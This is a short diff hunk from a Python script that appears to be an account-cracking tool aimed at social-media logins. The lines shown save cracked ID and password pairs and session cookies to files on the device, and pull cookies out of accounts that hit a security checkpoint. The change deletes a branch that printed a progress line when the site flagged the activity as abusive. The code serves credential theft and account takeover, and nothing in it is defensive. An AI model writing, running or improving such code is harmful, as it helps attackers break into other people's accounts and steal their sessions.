@@ -858,9 +858,6 @@ def m1(ids,pwv):
                         open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')                        
                         oks.append(cid)
                         break
-            elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
-                sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\033[38;5;196m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
-                sys.stdout.flush()
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
